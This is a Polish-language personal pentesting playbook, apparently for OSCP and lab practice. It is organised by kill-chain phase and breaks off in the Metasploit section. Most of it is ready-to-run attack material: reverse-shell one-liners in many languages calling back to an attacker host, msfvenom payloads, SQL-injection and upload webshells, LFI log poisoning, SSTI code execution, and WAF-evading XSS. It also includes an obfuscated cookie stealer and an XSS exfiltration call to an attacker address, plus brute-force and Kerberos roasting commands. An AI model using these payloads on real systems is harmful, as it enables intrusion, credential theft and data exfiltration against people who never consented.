# 🗡️ Pentest Playbook — Kill Chain Edition

> Osobista ściąga uporządkowana wg **faz ataku** (cyber kill chain), a nie wg narzędzi.
> Kiedy jesteś na danym etapie zaczepienia — wchodzisz do odpowiedniego rozdziału i masz wszystko pod ręką.
>
> Oryginalny, „płaski” plik trzymam jako backup w **`Commands.md`**.

---

## 📑 Spis treści / Nawigacja

| # | Faza | Co tu znajdziesz |
|---|------|------------------|
| [0](#0-setup--zmienne-robocze) | **Setup** | Zmienne robocze, konwencje |
| [1](#1-recon--enumeration-rozpoznanie) | **Recon & Enumeration** | Nmap, web, DNS, SMB, SNMP, LDAP, RPC, AD user enum, hydra, vuln scan (NSE/Nessus) |
| [2](#2-initial-access--exploitation-uzyskanie-dostepu) | **Initial Access / Exploitation** | SQLi, LFI/RFI, upload, cmd injection, SSTI, XSS, SQLMap, reverse shells, TTY, exploity, Metasploit, client-side |
| [3](#3-post-exploitation--situational-awareness) | **Situational Awareness** | Rozpoznanie lokalne Linux / Windows |
| [4](#4-privilege-escalation-eskalacja-uprawnien) | **Privilege Escalation** | Linux (SUID/sudo/cron/caps) i Windows (services/DLL/registry) |
| [5](#5-credential-access-pozyskiwanie-poswiadczen) | **Credential Access** | John, hashcat, *2john, spraying, mimikatz, Kerberos, Responder, NTLM relay |
| [6](#6-active-directory) | **Active Directory** | BloodHound, PowerView, net/wmic, MSSQL |
| [7](#7-lateral-movement-ruch-boczny) | **Lateral Movement** | PsExec/WinRM/sc/WMI, PtH/PtT/PtK, RDP hijack |
| [8](#8-pivoting--port-forwarding) | **Pivoting** | SSH tunnels, socat, chisel, proxychains, DPI/DNS tunneling (dnscat2) |
| [9](#9-exfiltration--file-transfer) | **Exfiltration & Transfer** | Przerzucanie plików w obie strony |
| [10](#10-persistence--backdooring) | **Persistence** | Backdoory, scheduled tasks |
| [11](#11-blue-team--forensics) | **Blue Team / Forensics** | Detekcja, ausearch, analiza plików Windows |
| [12](#12-toolbox--reference) | **Toolbox** | grep, awk, find, xxd, git i inne narzędzia bazowe |
| [13](#13-cloud--aws-enumeracja-i-atak) | **Cloud (AWS)** | S3, IAM, EC2, Lambda — enumeracja i eskalacja w chmurze |
| [14](#14-reporting--technical-report) | **Reporting** | Notatki, struktura raportu, PoC, remediation, walkthrough |
| [A](#appendix-a--skroty-klawiszowe-shell) | **Appendix A** | Skróty klawiszowe shella |
| [B](#appendix-b--oscp-exam-playbook--metodyka) | **Appendix B** | OSCP exam playbook — metodyka, checklisty, pułapki |

---

## 0. Setup / Zmienne robocze

> Ustaw zmienne na początku sesji — wtedy komendy niżej kopiujesz 1:1 bez podmieniania IP.

```bash
export IP=10.10.10.10          # cel
export LHOST=10.14.0.1         # twój tun0 (sprawdź: ip a show tun0)
export LPORT=4444
export DOMAIN=tryhackme.loc
export DC=10.211.11.10         # domain controller
```

**Legenda placeholderów używanych niżej:** `TARGET_IP` = cel, `ATTACKER_IP`/`LHOST` = twoja maszyna, `DC` = kontroler domeny.

**Szybki start rozpoznania (odpal i idź parzyć kawę):**
```bash
sudo nmap --privileged -p- -sV -sC -T4 -v -oN nmap_full.txt $IP
```

---

# 1. Recon & Enumeration (Rozpoznanie)

> Cel fazy: zmapować powierzchnię ataku — otwarte porty, usługi, wersje, domeny, share'y, użytkownicy.
> **Zasada:** enumerate → enumerate → enumerate. 90% pracy to rozpoznanie.

## 1.1 Host discovery (co żyje w sieci?)

Sweep po zakresie IP (reverse DNS):
```bash
for ip in $(seq 64 79); do host 167.114.21.$ip; done | grep -Ev "not found|timed out"
```

Ping sweep / szybkie wykrycie żywych hostów (bez skanu portów):
```bash
nmap -sn 10.10.10.0/24 -oN live_hosts.txt          # -sn = ping scan, no ports
fping -a -g 10.10.10.0/24 2>/dev/null              # szybsza alternatywa
```

## 1.2 Port scanning — Nmap

Pełny, dokładny skan (mój domyślny):
```bash
nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt $IP
# -p-  wszystkie 65535 portów | -sV wersje | -sC skrypty default | -T4 szybko | -oN zapis
```

**Trik dwuetapowy (szybko → głęboko)** — najpierw znajdź otwarte porty, potem skanuj tylko je:
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d/ -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC -A -oN nmap_deep.txt $IP
```

UDP (wolne — celuj w konkretne porty; SNMP/DNS/TFTP/IKE):
```bash
sudo nmap -sU --top-ports 20 -oN nmap_udp.txt $IP
```

Kategorie skryptów NSE (świetne do enumeracji):
```bash
nmap -p445 --script smb-enum-shares $IP           # które share dają RW
nmap -v -p 139,445 --script smb $IP               # cała rodzina skryptów SMB
nmap -p445 --script "vuln" $IP                     # znane podatności
ls /usr/share/nmap/scripts/ | grep smb             # przegląd dostępnych skryptów
```

## 1.3 Web enumeration

### Gobuster
```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 40 -x php,txt,bak,tar.gz,zip,html -o gobuster.txt -b 404,400
# -x rozszerzenia | -b blacklist kodów statusu | -t wątki
```
Vhosty (wirtualne hosty na tym samym IP):
```bash
gobuster vhost -u http://$IP -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -o vhosts.txt
```

### ffuf — szybszy i elastyczniejszy (warto znać obok gobustera)
```bash
# Katalogi
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60
# Vhost fuzzing (filtruj po rozmiarze odpowiedzi -fs, żeby uciąć śmieci)
ffuf -u http://$IP -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 4242
# Parametry GET
ffuf -u "http://$IP/page?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

> 💡 **Zawsze** sprawdź źródło strony, `/robots.txt`, `/sitemap.xml`, nagłówki (`curl -I`), technologie (`whatweb $IP`), oraz komentarze w HTML. `nikto -h http://$IP` na szybki przegląd.

## 1.4 DNS

```bash
dnsenum $DOMAIN
dnsrecon -d $DOMAIN -t std                          # standard
dnsrecon -d $DOMAIN -D ~/wordlist.txt -t brt        # brute subdomen
# Strefowy transfer (jackpot, jeśli zadziała):
dig axfr @$IP $DOMAIN
```

## 1.5 SMB / NetBIOS (porty 139, 445)

> Port **139** = NetBIOS (stare, komunikacja w LAN); port **445** = SMB.

```bash
sudo nbtscan -r 10.10.10.0/24                       # -r skanuje NetBIOS 137
```
Listowanie i anonimowe logowanie:
```bash
smbclient -L //$IP -N                               # -N = null session (bez hasła)
smbclient //$IP/SHARE_NAME -N                       # podłącz się do konkretnego share
smbmap -H $IP                                        # pokazuje uprawnienia R/W per share
smbmap -H $IP -u guest                               # spróbuj z kontem guest
```
enum4linux-ng (users, groups, shares, policy, RID cycling):
```bash
enum4linux-ng -A $IP -oA results/scan
# -A = wszystkie funkcje | -oA = zapis do YAML + JSON
```
CrackMapExec — szwajcarski scyzoryk SMB/LDAP/WinRM:
```bash
crackmapexec smb $IP --pass-pol                      # polityka haseł (bez creds jeśli anon)
crackmapexec smb $IP -u users.txt -p passwords.txt   # password spray
crackmapexec smb $IP -u user -p pass --shares        # listuj share'y z poświadczeniami
crackmapexec smb $IP -u user -p pass --sam           # dump SAM (jeśli admin)
# Wskazówka: (Pwn3d!) w outputcie = masz admina na tym hoscie
```

### rpcclient (MSRPC przez SMB)
```bash
rpcclient -U "" $IP -N                                # -U "" pusty user, -N bez hasła (anon)
```
Wewnątrz konsoli: `enumdomusers`, `enumdomgroups`, `queryuser 0x1f4`, `queryuser <RID>`.
> RID **500** = Administrator, **501** = Guest, **512-514** = Domain Admins/Users/Guests. Konta użytkowników zwykle od **1000** w górę.

RID cycling (wyciągnij userów po RID-ach):
```bash
for i in $(seq 500 2000); do \
  user=$(echo "queryuser $i" | rpcclient -U "" -N $IP 2>/dev/null | grep -i "User Name"); \
  if [ -n "$user" ]; then echo "[RID: $i] $user"; fi; done
```
Wycinanie userów z outputu enumdomusers (`[nazwa]` → users.txt):
```bash
awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt
# -F'[][]' ustawia [ oraz ] jako separatory | print $2 = to co między pierwszym [ a ]
```

## 1.6 SNMP (port 161/UDP)

> MIB Table zawiera kody OID. Community string domyślnie `public` (read).

```bash
snmpwalk -c public -v1 -t 10 $IP                      # cały MIB tree (-t 10 = timeout 10s)
snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25       # konta użytkowników
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2      # uruchomione procesy
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2      # zainstalowane oprogramowanie
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3        # otwarte porty TCP
# Zgadywanie community stringów:
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
```

## 1.7 LDAP (port 389 / 636)

Test anonimowego bindu:
```bash
ldapsearch -x -H ldap://$IP -s base                   # -x prosta auth (anon), -s base tylko obiekt bazowy
```
Dump użytkowników z DC:
```bash
ldapsearch -x -H ldap://$IP -b "dc=tryhackme,dc=loc" "(objectClass=person)"
# Ciekawe: szukaj haseł w polu description
ldapsearch -x -H ldap://$IP -b "dc=tryhackme,dc=loc" "(objectClass=user)" description
```

## 1.8 AD user enumeration (bez poświadczeń)

### kerbrute — walidacja userów po Kerberos pre-auth (cichsze niż SMB brute)
```bash
kerbrute userenum --dc $DC -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
> Najpierw enumeruj (enum4linux/rpc/ldap), zbuduj `users.txt`, a `kerbrute` potwierdzi które konta istnieją, są aktywne i nie są honeypotami.

### AS-REP Roasting (GetNPUsers) — konta bez wymaganego pre-auth
```bash
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
# Zbiera hashe AS-REP dla podatnych kont → łamiesz offline (hashcat -m 18200)
```

## 1.9 Online password attacks (hydra + budowanie list)

> Brute force **usług sieciowych** (nie hashy — to §5). Zawsze najpierw spróbuj defaultów i creds znalezionych w enumeracji.

### Hydra — najczęstsze protokoły
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP
hydra -L users.txt -P pass.txt ftp://$IP
hydra -l admin -P rockyou.txt rdp://$IP
hydra -L users.txt -P pass.txt $IP smb                       # -t 1 (SMB nie lubi wielu wątków)
# HTTP POST form — F=marker błędu, ^USER^/^PASS^ podstawiane
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"
# HTTP Basic Auth
hydra -L users.txt -P pass.txt $IP http-get /admin/
```
> Alternatywy: `crackmapexec smb $IP -u users.txt -p pass.txt` (spray), `netexec`, `medusa`, `patator`.

### Budowanie celowanych wordlist
```bash
cewl -d 3 -m 5 -w wordlist.txt http://$IP                    # słowa ze strony celu
# Mutacje hasłami (dopisz cyfry/znaki) — hashcat rules:
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
# Generowanie loginów z imion i nazwisk:
./Scripts/username_generator/username_generator.py   # własny skrypt w repo
# username-anarchy (imię.nazwisko, inicjały itd.):
username-anarchy Jan Kowalski > users.txt
```
> 💡 Własne skrypty pomocnicze masz w `./Scripts/` (LFI scanner, RPC enum, session bruteforce, php_mt_seed, PadBuster do padding oracle).

## 1.10 Vulnerability scanning (skanery + NSE)

> Skanery automatyzują dopasowanie „wersja usługi → znane CVE”. Traktuj wynik jako **trop, nie dowód** — zawsze weryfikuj ręcznie (false-positive/negative). Na OSCP: automaty jako uzupełnienie enumeracji, nigdy zamiast niej.

### Nmap NSE — skrypty vuln
```bash
ls /usr/share/nmap/scripts | grep -i vuln           # co jest dostępne lokalnie
grep '"vuln"' /usr/share/nmap/scripts/script.db      # skrypty z kategorii vuln
sudo nmap -sV -p 443 --script "vuln" $IP             # cała kategoria vuln (głośne, intrusive)
sudo nmap -sV --script "http-vuln*" $IP              # wybrany zestaw po nazwie
sudo nmap -sV --script vulners $IP                   # vulners: wersja → CVE + linki do exploitów
```
### Dodanie własnego skryptu NSE (np. świeży CVE z GitHuba)
```bash
sudo cp http-vuln-cve2021-41773.nse /usr/share/nmap/scripts/
sudo nmap --script-updatedb                          # przebuduj bazę skryptów
sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" $IP
```
### Nessus (GUI, kompleksowy skaner)
```bash
sudo dpkg -i Nessus-*.deb        # instalacja z .deb (Kali)
sudo systemctl start nessusd     # start usługi
# konfiguracja: https://kali:8834/  → New Scan → Basic Network Scan → podaj zakres IP
```
> Inne skanery: **nikto** (web) `nikto -h http://$IP`, **wpscan** (WordPress) `wpscan --url http://$IP`, **nuclei** (szablony CVE) `nuclei -u http://$IP`.

---

# 2. Initial Access / Exploitation (Uzyskanie dostępu)

> Cel fazy: pierwszy shell / pierwsze poświadczenia. Web, słabe hasła, znane CVE.

## 2.1 Web attacks — SQL Injection

### Boolean-based (autoryzacja / logika)
```sql
offsec' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

### UNION-based (wyciąganie danych)
```sql
-- 1. Ustal liczbę kolumn
' ORDER BY 1-- //          -- zwiększaj aż poleci błąd
-- 2. Potwierdź liczbę kolumn i pozycje wyświetlane
%' UNION SELECT 'a1','a2','a3','a4','a5' -- //
-- 3. Enumeracja bazy
' UNION SELECT null,null,database(),user(),@@version -- //
-- 4. Tabele i kolumny
' union select null,table_name,column_name,table_schema,null from information_schema.columns where table_schema=database() -- //
-- 5. WebShell na dysk (INTO OUTFILE)
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
-- następnie: http://TARGET_IP/tmp/webshell.php?cmd=id
```

### Blind (time-based)
```sql
' AND IF (1=1, sleep(3),'false') -- //
```

### MSSQL — RCE przez xp_cmdshell
```bash
impacket-mssqlclient Administrator:Lab123@$IP -windows-auth   # 1. wejdź do bazy
```
```sql
EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

## 2.2 SQLMap (automatyzacja)

```bash
# Szybkie znalezienie punktu wstrzyknięcia (GET)
sqlmap -u "http://$IP/blindsqli.php?user=1" -p user
sqlmap -u "http://$IP/blindsqli.php?user=1" -p user --dump     # dump danych

# POST — podmień nazwy pól (submit, username, password wg formularza)
sqlmap -u "http://$IP/login.php" --data="pma_username=admin&pma_password=password&submit=Go" \
  --method POST --level 3 --risk 2 --batch --dbs

# Dla opornych serwerów (dodatkowe pola)
sqlmap -u "http://$IP/index.php" --data="pma_username=admin&pma_password=password&server=1&target=index.php" \
  --method POST --level 3 --risk 2 --batch --dbs

# Z zapisanego requestu Burpa (najwygodniejsze przy złożonych sesjach/nagłówkach)
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"   # os-shell = RCE
```

## 2.3 WAF bypass / encoding (notatki)

```
URL-encoding:      / => %2f
Hex-encoding:      _ => \x5f, 0x5f
Unicode-encoding:  % => %
Mixed-case, białe znaki i komentarze do omijania filtrów:
  '/**/UNION/**/SELECT/**/1,2
XSS przez encoding znaków:
  <img src=x onerror=&#97;lert(1)>                          (decimal 'a')
  <svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>            (hex 'alert')
  <body onload=&#97;&#108;&#101;&#114;&#116;(1)>           (full decimal)
  <a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>
```
**Alternatywne metody HTTP** (WAF czasem nie filtruje wszystkich):
`HEAD` (tylko nagłówki), `OPTIONS` (dozwolone metody/CORS), `PUT`/`PATCH` (update REST),
`DELETE` (usuwanie), `TRACE` (echo requestu). Test: `curl -X OPTIONS -i http://$IP/`.

## 2.4 LFI / RFI (Local / Remote File Inclusion)

> Parametr ładujący pliki (`?page=`, `?file=`, `?lang=`) → czytanie plików lub RCE.

**Podstawowy odczyt + path traversal:**
```
http://$IP/index.php?page=/etc/passwd
http://$IP/index.php?page=../../../../../../etc/passwd
http://$IP/index.php?page=....//....//....//etc/passwd     # bypass filtra ../
http://$IP/index.php?page=/etc/passwd%00                    # null byte (stare PHP <5.3.4)
```
**Ciekawe pliki do wyciągnięcia (Linux):**
```
/etc/passwd  /etc/shadow  /etc/hosts  /proc/self/environ
/var/www/html/config.php  /home/USER/.ssh/id_rsa  /root/.bash_history
/var/log/apache2/access.log   /var/log/auth.log
```
**Windows:** `C:\Windows\System32\drivers\etc\hosts`, `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`, `C:\Users\USER\.ssh\id_rsa`.

**PHP wrappers (odczyt źródła i RCE):**
```
# Base64 kodowanie źródła PHP (żeby serwer nie wykonał, tylko pokazał)
php://filter/convert.base64-encode/resource=index.php
# RCE przez data:// (jeśli allow_url_include=On)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
# RCE przez wykonanie payloadu z inputu
php://input   (POST body: <?php system($_GET['c']);?>)
# expect:// (jeśli rozszerzenie expect włączone)
expect://id
```
**Log poisoning → RCE** (wstrzyknij PHP do logu, potem załaduj log przez LFI):
```bash
# 1. Zatruj User-Agent
curl -A "<?php system(\$_GET['c']); ?>" http://$IP/
# 2. Załaduj log przez LFI
http://$IP/index.php?page=/var/log/apache2/access.log&c=id
```
**RFI** (gdy `allow_url_include=On`) — serwuj payload u siebie i wskaż URL:
```
http://$IP/index.php?page=http://$LHOST:8000/shell.txt&c=id
```

## 2.5 File Upload bypass

> Cel: wgrać webshell/reverse shell mimo filtrów.
```php
# shell.php — minimalny webshell
<?php system($_GET['cmd']); ?>
```
**Techniki omijania filtrów rozszerzeń:**
```
shell.php  →  shell.phtml / .php3 / .php4 / .php5 / .php7 / .phar / .pht
shell.php.jpg           # double extension (gdy serwer bierze pierwsze)
shell.jpg.php           # gdy bierze ostatnie
shell.php%00.jpg        # null byte
shell.pHp               # mixed case
```
**Content-Type spoofing** (w Burpie zmień na `image/jpeg`) + **magic bytes** (dodaj `GIF89a;` na początku pliku, żeby przeszedł walidację obrazu):
```
GIF89a;
<?php system($_GET['cmd']); ?>
```
`.htaccess` upload (wymuś parsowanie .jpg jako PHP):
```
AddType application/x-httpd-php .jpg
```
> Uploady ASP/ASPX (IIS): `shell.aspx`, `shell.asp;.jpg`. Zawsze sprawdź gdzie ląduje plik (`/uploads/`).

## 2.6 Command Injection

> Parametr trafiający do shella. Separatory łańcuchowe:
```bash
; id            # sekwencyjnie
| id            # pipe
|| id           # gdy pierwsza komenda faila
&& id           # gdy pierwsza sukces
` id `          # backticks
$(id)           # command substitution
%0a id          # newline (URL-encoded)
```
**Blind command injection (bez outputu)** — potwierdź OOB:
```bash
ping -c 4 $LHOST                 # nasłuchuj: sudo tcpdump -i tun0 icmp
curl http://$LHOST:8000/$(whoami)   # zobaczysz nazwę w logach http.server
sleep 5                          # time-based potwierdzenie
```

## 2.7 SSTI (Server-Side Template Injection)

> Wykryj: wstrzyknij `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` — jeśli zwróci `49`, silnik szablonów wykonuje kod.

**Jinja2 / Python — RCE:**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
> Rozbiór: `self` = obiekt szablonu → `__init__` → `__globals__` (słownik globali) → `__builtins__` (wbudowane funkcje) → `__import__('os')` → `popen('id').read()`.

**Bypass filtrów przez hex** — Python czyta `\x6f\x73` jako `os` (zamień stringi na hex, strukturę `self`/`()` zostaw):
```
'\x6f\x73'  ==  'os'      (o=6f, s=73)
```
**Inne silniki (szybka ściąga):**
```
Twig (PHP):   {{['id']|filter('system')}}
Freemarker:   <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
Ruby ERB:     <%= `id` %>
```
> 🔗 Metodyka i payloady per-silnik: PayloadsAllTheThings / tplmap.

## 2.8 XSS (cookie stealing + exfiltracja)

**Kradzież ciasteczka (base64-encoded payload, żeby ominąć filtry):**
```html
<img src=x onerror=eval(atob('d2luZG93LmxvY2F0aW9uPSdodHRwOi8vMTkyLjE2OC4xODAuNzk6ODAwMC8/Yz0nK2RvY3VtZW50LmNvb2tpZQ=='))>
<!-- atob() dekoduje base64 → window.location='http://ATTACKER:8000/?c='+document.cookie -->
```
Nasłuch: `python3 -m http.server 8000` — ciasteczko wpadnie w parametrze `?c=`.

**Obfuskacja hex/unicode (bypass WAF):**
```html
<iframe src=ja&#x0D;vascript&colon;setTimeout('\x66\x65\x74\x63\x68...')></iframe>
```
**Fetch danych z niedostępnej dla nas ścieżki (SSRF-like przez XSS ofiary):**
```html
<script>
fetch('/internal/secret')
  .then(r=>r.json())
  .then(data=>fetch('http://ATTACKER/logger?data='+btoa(JSON.stringify(data))));
</script>
```

## 2.9 Reverse shells — katalog

> Odpal listener na swojej maszynie **zanim** wywołasz payload: `nc -lvnp $LPORT` (lub `rlwrap nc -lvnp $LPORT` dla historii/edycji).

### Bash
```bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```
### Netcat
```bash
nc -e /bin/sh $LHOST $LPORT
# Wersja bez -e (gdy netcat okrojony):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
```
### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$LHOST'",'$LPORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```
### PERL
```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### PHP
```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
### Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
### socat (stabilniejszy, pełny TTY jednym strzałem)
```bash
# Listener (Ty):
socat file:`tty`,raw,echo=0 TCP-L:$LPORT
# Ofiara:
socat TCP:$LHOST:$LPORT EXEC:'bash',pty,stderr,setsid,sigint,sane
```
### xterm (klasyk)
```bash
# Ofiara łączy się z Twoim X-serwerem na TCP 6001:
xterm -display 10.0.0.1:1
# U Ciebie: Xnest :1  oraz  xhost +targetip
```
### PowerShell (Windows) — one-liner
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
> 🔗 Gdy nic nie działa: **https://www.revshells.com** — generator wszystkich powyższych + msfvenom, z podstawianiem IP/portu.

### msfvenom — generowanie payloadów
```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
# Windows EXE (meterpreter)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
# Windows service EXE (do sc.exe)
msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe-service -o myservice.exe
# MSI installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o installer.msi
# PHP webshell
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
```

## 2.10 Webshelle

### Linux — reverse one-liner zrzucany do pliku
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/'$LHOST'/'$LPORT' 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
```
### Windows — pomocnicze
Sprawdź czy webshell wykonuje przez CMD czy PowerShell:
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
Pobranie powercat na maszynę atakującą (do serwowania na Windę):
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

## 2.11 Stabilizacja shella (upgrade do pełnego TTY)

> 🔗 Kompletny przewodnik: https://0xffsec.com/handbook/shells/full-tty/

```bash
# 1. Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# (alternatywy: script /dev/null -c bash   |   /usr/bin/script -qc /bin/bash /dev/null)
# 2. Wciśnij Ctrl+Z (usypia shell)
# 3. Na SWOIM terminalu:
stty raw -echo && fg
# 4. W shellu ofiary przywróć zmienne:
export TERM=xterm; export SHELL=bash
# 5. Dopasuj rozmiar okna (sprawdź `stty size` u siebie):
stty rows 38 columns 116
```

## 2.12 Locating & fixing public exploits

> Zanim uruchomisz cudzy exploit — **przeczytaj kod**. Publiczne PoC bywają celowo złośliwe (ukryty destrukcyjny payload w hex) albo po prostu psują cel. Dekoduj każdy „shellcode”/hex, zanim zaufasz.

### Szukanie
```bash
searchsploit apache 2.4.49                # szukaj po nazwie/wersji
searchsploit -t oracle windows            # -t = tylko w tytule
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
searchsploit -m 42341                     # -m = skopiuj (mirror) exploit do CWD
searchsploit -p 39446                     # -p = pełna ścieżka + URL exploit-db
ls /usr/share/exploitdb/exploits          # lokalne repo exploit-db
```
> Źródła online: **exploit-db.com**, **github.com** (`site:github.com <produkt> <wersja> exploit`), **packetstorm**, **nvd.nist.gov** (CVE→opis), **vulners.com**.

### Weryfikacja PoC przed uruchomieniem
```bash
# Ukryty payload w hex? Zdekoduj do czytelnej postaci, ZANIM odpalisz:
python3 -c 'print(bytes.fromhex("726d202d7266"))'    # → pokaże co naprawdę robi „shellcode”
```
> Czerwone flagi w PoC: `rm -rf`, `curl|bash` na obcy host, zaciemniony base64/hex, socket wychodzący poza cel. Testuj w izolowanej VM/wine, nie na swoim Kali produkcyjnym.

### Poprawianie / kompilacja exploitów
```bash
# Cross-kompilacja C dla Windows na Kali:
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32   # -lws2_32 gdy używa Winsock (WSAStartup/socket)
wine exploit.exe                                       # bezpieczny test na Kali
# Regeneracja shellcode dla BOF (podmień zmienną 'shellcode' w PoC):
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread \
  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"         # -b = zakazane znaki (bad chars)
```
> Typowe zmiany w PoC: IP/port atakującego, ścieżka/URL celu, offset i adres powrotu (`JMP ESP`), payload (`<?php system($_GET['cmd']);?>` dla webshelli). Exploity webowe uruchamiasz po edycji zwykle: `python2 exploit_modified.py`, potem `curl -k https://$IP/uploads/shell.php?cmd=whoami`.

## 2.13 Metasploit Framework (MSF)

> Framework spinający recon → exploit → post-exploit → pivot. Na OSCP: **limit 1 użycia MSF na maszynę standalone** (przemyśl, gdzie go zużyjesz); w zestawie AD zwykle bez ograniczeń — sprawdź aktualny Exam Guide.

### Start i baza
```bash
sudo msfdb init          # inicjalizacja bazy postgres (raz)
sudo msfconsole          # start
```
```
db_status                # sprawdź połączenie z bazą
workspace -a pen200      # nowy workspace (izoluj projekty)
db_nmap -A $IP           # nmap z zapisem wyników do bazy
hosts                    # hosty w bazie
services -p 445          # usługi (filtr po porcie)
```
### Moduły — search / use / options / run
```
search type:exploit apache 2.4.49
search type:auxiliary smb          # skanery / enum
use 0                              # wybierz po indeksie z ostatniego search
use exploit/windows/smb/psexec     # albo po pełnej nazwie
show options                       # wymagane parametry
set RHOSTS $IP
set LHOST tun0                     # możesz podać interfejs zamiast IP
set LPORT 443
run                                # lub: exploit   (exploit -j = w tle jako job)
```
> `setg` ustawia zmienną GLOBALNIE dla wszystkich modułów (`setg RHOSTS $IP`). `services -p 445 --rhosts` wrzuca hosty z bazy do RHOSTS.

### Payloady — staged vs non-staged
```
show payloads                      # kompatybilne z wybranym exploitem
set payload windows/x64/meterpreter/reverse_tcp   # staged (meterpreter)
set payload linux/x64/shell_reverse_tcp           # non-staged (zwykły shell)
```
> **Staged** (`/meterpreter/reverse_tcp`) = mały stager dociąga resztę. **Non-staged** (`_reverse_tcp` bez `/`) = cały payload naraz — stabilniejszy przez proxy/tunel.

### Multi/handler — listener pod payload z msfvenom
```
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 443
run -j                             # w tle; jobs = lista, kill <id> = zabij
```
### Meterpreter — post-exploitation
```
sysinfo ; getuid                   # kim / gdzie jestem
ps ; migrate <PID>                 # przeskocz do stabilnego procesu (np. explorer.exe)
getsystem                          # próba eskalacji do SYSTEM (Windows)
hashdump                           # dump SAM (po SYSTEM)
